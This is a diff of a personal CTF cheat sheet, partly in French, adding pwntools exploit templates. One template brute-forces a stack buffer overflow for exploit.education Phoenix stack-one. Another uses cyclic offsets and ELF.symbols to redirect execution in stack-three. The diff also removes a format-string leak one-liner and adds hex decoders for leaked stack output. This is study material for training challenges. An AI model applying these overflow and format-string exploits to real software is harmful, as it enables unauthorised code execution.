@@ -1,6 +1,18 @@
-# CTF Tricks
+# Tips & Tricks : CTF
 
-## Tech Tricks (cheat sheet)
+<p style="text-align: right">_- last update 17/09/2021 -_</p>
+
+Cet article est voué à évoluer régulièrement. Il me permet de regrouper les
+quelques informations que je juge intéressantes à propos de la résolution de
+CTF. Les techniques qu'il explose sont très peu détaillées, mais cette page a
+pour objectif d'être la plus synthétique possible pour être parcouru
+rapidement pendant les compétitions.
+
+## Summary
+
+* [Pwntools Templates](#pwntools-templates)
+
+## Cheat Sheet
 
 ### C (lang)
 
@@ -26,9 +38,24 @@ Decode an valid hex string *(sample)*
 bytes.fromhex(sample).decode()
 ```
 
-### Pnwtools
+Decode an hex stack output (result of a format string for exemple)
 
-Template classique pour un exploit de format string
+```python
+for b in [ extract[i:i+8] for i in range(0, len(extract), 8) ]:
+  try :
+    print(b, "-", bytes.fromhex(b).decode()[::-1])
+  except :
+    print(b, "✖")
+```
+
+## Examples
+
+### Pwntools Templates
+
+**Important:** [documentation](https://docs.pwntools.com/en/stable/)
+
+Template classique pour un exploit de format string (solves
+[picoctf#105](https://play.picoctf.org/practice/challenge/105))
 
 ```python
 #!/bin/python
@@ -55,23 +82,64 @@ for octets in [ extract[i:i+8] for i in range(0, len(extract), 8) ]:
     print(octets, "✖")
 ```
 
-## Applied
-
-### Format string injection
-
-The following payload can be modified to export as many bytes as necessary /
-possible:
-
-```bash
-python -c 'print("1"+"%08x"*100)' | ./vulnerable
-```
-
-Then the output can be decoded with:
+Template for feeding a process in search of the right output (solves
+[exploit-education#1](https://exploit.education/phoenix/stack-one/))
 
 ```python
-for b in [ extract[i:i+8] for i in range(0, len(extract), 8) ]:
-  try :
-    print(b, "-", bytes.fromhex(b).decode()[::-1])
-  except :
-    print(b, "✖")
+#!/bin/python
+
+from pwn import *
+import struct
+
+probes = [
+    'a.out: specify an argument, to be copied into the "buffer"',
+    'Getting closer! changeme is currently 0x00000000, we want 0x496c5962',
+    'Getting closer! changeme is currently 0x00000049, we want 0x496c5962',
+    'Getting closer! changeme is currently 0x0000496c, we want 0x496c5962',
+    'Getting closer! changeme is currently 0x00496c59, we want 0x496c5962',
+]
+target = struct.pack("I", 0x496c5962)
+result = probes[0]
+cmpt = 0
+
+while result in probes:
+    payload = b"a" * cmpt + target
+    conn = process(['./a.out', payload])
+    conn.readline()
+    result = conn.readline().decode().strip()
+    cmpt += 1
+    print(result)
+    print(cmpt, payload)
+```
+
+Automatic payload creation :
+
+* Using `cyclic` to find a vulnerable buffer size
+* Using `ELF.symbols` to look for a function's pointer address
+
+(solves [exploit-education#3](https://exploit.education/phoenix/stack-three/)
+
+```python
+#!/bin/python
+
+from pwn import *
+import struct
+
+conn = process('./a.out')
+payload = cyclic(100)
+print(conn.recvline())
+conn.sendline(payload)
+extract = conn.recvline().decode().strip().split('x')[1]
+offset = cyclic_find(bytes.fromhex(extract).decode()[:4])
+
+e = ELF('./a.out')
+print(hex(e.symbols['complete_level']))
+target = p32(e.symbols['complete_level'])
+
+payload = cyclic(offset - 1) + target
+conn = process('./a.out')
+print(conn.recvline().decode())
+conn.sendline(payload)
+print(conn.recvline().decode())
+print(conn.recvline().decode())
 ```
